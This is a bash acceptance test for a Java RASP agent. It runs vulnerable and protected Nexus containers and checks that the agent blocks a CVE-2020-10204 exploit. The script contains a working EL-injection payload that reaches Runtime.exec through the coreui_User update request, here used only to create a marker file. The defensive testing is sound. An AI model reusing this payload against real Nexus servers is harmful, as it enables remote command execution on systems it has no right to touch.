#!/usr/bin/env bash
set -euo pipefail

image="${OHMYRASP_VULHUB_NEXUS_10204_IMAGE:-vulhub/nexus:3.21.1}"
baseline_name="${OHMYRASP_VULHUB_NEXUS_10204_BASELINE_NAME:-ohmyrasp-vulhub-nexus10204-baseline}"
protected_name="${OHMYRASP_VULHUB_NEXUS_10204_PROTECTED_NAME:-ohmyrasp-vulhub-nexus10204-protected}"
baseline_port="${OHMYRASP_VULHUB_NEXUS_10204_BASELINE_PORT:-18683}"
protected_port="${OHMYRASP_VULHUB_NEXUS_10204_PROTECTED_PORT:-18684}"
marker="${OHMYRASP_VULHUB_NEXUS_10204_MARKER:-/tmp/ohmyrasp-nexus10204-success}"
admin_password_file="${OHMYRASP_VULHUB_NEXUS_10204_ADMIN_PASSWORD_FILE:-/tmp/vulhub-ohmyrasp-20260603/nexus/CVE-2020-10204/admin.password}"

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd -- "${script_dir}/../.." && pwd)"
agent_root="${repo_root}/java-agent"
agent_jar="${agent_root}/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
work_dir="${OHMYRASP_VULHUB_NEXUS_10204_WORK_DIR:-/tmp/ohmyrasp-nexus10204}"
baseline_response="${work_dir}/baseline-response.txt"
protected_response="${work_dir}/protected-response.txt"
baseline_user_response="${work_dir}/baseline-user-read.txt"
protected_user_response="${work_dir}/protected-user-read.txt"
protected_logs="${work_dir}/protected-logs"
protected_log="${protected_logs}/events.jsonl"

cleanup() {
  docker rm -f "${baseline_name}" "${protected_name}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

json_payload() {
  python3 - "$marker" <<'PY'
import json
import sys

marker = sys.argv[1]
expression = (
    "''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec("
    + repr("touch " + marker)
    + ")"
)
payload = {
    "action": "coreui_User",
    "method": "update",
    "data": [
        {
            "userId": "admin",
            "version": "1",
            "realm": "default",
            "firstName": "admin",
            "lastName": "User",
            "email": "admin@example.org",
            "status": "active",
            "roles": ["nx-admin$\\A{" + expression + "}"],
        }
    ],
    "type": "rpc",
    "tid": 11,
}
print(json.dumps(payload, separators=(",", ":")))
PY
}

wait_for_http() {
  local port="$1"
  local name="$2"
  for attempt in $(seq 1 150); do
    local status
    status="$(curl -fsS -o /dev/null -w '%{http_code}' "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "${status}" == "200" || "${status}" == "302" ]]; then
      return 0
    fi
    sleep 2
  done
  echo "Nexus ${name} did not become ready" >&2
  docker logs --tail 160 "${name}" >&2 || true
  return 1
}

read_users() {
  local port="$1"
  local response_file="$2"
  local status
  status="$(
    curl -sS \
      -u admin:admin \
      -H "Content-Type: application/json" \
      -H "X-Nexus-UI: true" \
      -o "${response_file}" \
      -w '%{http_code}' \
      --data-binary '{"action":"coreui_User","method":"read","data":[{"page":1,"start":0,"limit":25}],"type":"rpc","tid":1}' \
      "http://127.0.0.1:${port}/service/extdirect"
  )"
  if [[ "${status}" != "200" ]] || ! grep -q '"success":true' "${response_file}"; then
    echo "Nexus user read failed on port ${port}; status=${status}" >&2
    cat "${response_file}" >&2 || true
    return 1
  fi
}

send_exploit() {
  local port="$1"
  local response_file="$2"
  local payload
  local status
  payload="$(json_payload)"
  status="$(
    curl -sS \
      -u admin:admin \
      -H "Content-Type: application/json" \
      -H "X-Nexus-UI: true" \
      -o "${response_file}" \
      -w '%{http_code}' \
      --data-binary "${payload}" \
      "http://127.0.0.1:${port}/service/extdirect"
  )"
  if [[ "${status}" != "200" ]]; then
    echo "Nexus CVE-2020-10204 exploit request failed on port ${port}; status=${status}" >&2
    cat "${response_file}" >&2 || true
    return 1
  fi
}

el_block_count() {
  grep -Ec '"algorithm":"java8_el_runtime_execution".*"action":"block"' "${protected_log}" 2>/dev/null || true
}

if [[ ! -f "${admin_password_file}" ]]; then
  echo "missing Nexus admin password fixture: ${admin_password_file}" >&2
  exit 1
fi

docker run --rm \
  -v "${agent_root}:/workspace" \
  -w /workspace \
  gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "${work_dir}"
mkdir -p "${protected_logs}"
cleanup

docker run -d \
  --name "${baseline_name}" \
  -p "${baseline_port}:8081" \
  -v "${admin_password_file}:/nexus-data/admin.password:ro" \
  "${image}" >/dev/null

docker run -d \
  --name "${protected_name}" \
  -p "${protected_port}:8081" \
  -v "${agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "${protected_logs}:/opt/ohmyrasp/logs" \
  -v "${admin_password_file}:/nexus-data/admin.password:ro" \
  -e "INSTALL4J_ADD_VM_PARAMS=-Xms1200m -Xmx1200m -XX:MaxDirectMemorySize=2g -Djava.util.prefs.userRoot=/nexus-data/javaprefs -javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "${image}" >/dev/null

wait_for_http "${baseline_port}" "${baseline_name}"
wait_for_http "${protected_port}" "${protected_name}"

if ! grep -q '"el_hook":"installed"' "${protected_log}"; then
  echo "protected Nexus Java8 agent did not report installed EL hook" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi

read_users "${baseline_port}" "${baseline_user_response}"
read_users "${protected_port}" "${protected_user_response}"

if grep -q '"event":"ohmyrasp-detection"' "${protected_log}"; then
  echo "protected Nexus logged a detection before the exploit" >&2
  cat "${protected_log}" >&2
  exit 1
fi

docker exec "${baseline_name}" rm -f "${marker}"
send_exploit "${baseline_port}" "${baseline_response}"
for _ in $(seq 1 20); do
  if docker exec "${baseline_name}" test -f "${marker}"; then
    break
  fi
  sleep 1
done

if ! docker exec "${baseline_name}" test -f "${marker}"; then
  echo "baseline Nexus CVE-2020-10204 exploit did not create marker" >&2
  cat "${baseline_response}" >&2 || true
  docker logs --tail 120 "${baseline_name}" >&2 || true
  exit 1
fi

docker exec "${protected_name}" rm -f "${marker}"
before_count="$(el_block_count)"
send_exploit "${protected_port}" "${protected_response}"
for _ in $(seq 1 20); do
  after_count="$(el_block_count)"
  if [[ "${after_count}" -gt "${before_count}" ]]; then
    break
  fi
  sleep 1
done

after_count="$(el_block_count)"
if [[ "${after_count}" -le "${before_count}" ]]; then
  echo "missing java8_el_runtime_execution block event for Nexus CVE-2020-10204" >&2
  cat "${protected_log}" >&2 || true
  cat "${protected_response}" >&2 || true
  exit 1
fi

if docker exec "${protected_name}" test -f "${marker}"; then
  echo "protected Nexus CVE-2020-10204 exploit created marker despite RASP" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi

if grep -q '"algorithm":"java8_command_execution_exploit_primitive"' "${protected_log}"; then
  echo "Nexus CVE-2020-10204 reached Runtime.exec instead of stopping at EL evaluation" >&2
  cat "${protected_log}" >&2
  exit 1
fi

if grep -q 'ohmyrasp-nexus10204-success' "${protected_log}"; then
  echo "protected EL event leaked the raw Nexus payload marker" >&2
  cat "${protected_log}" >&2
  exit 1
fi

echo "vulhub Nexus CVE-2020-10204 Java8 acceptance passed"
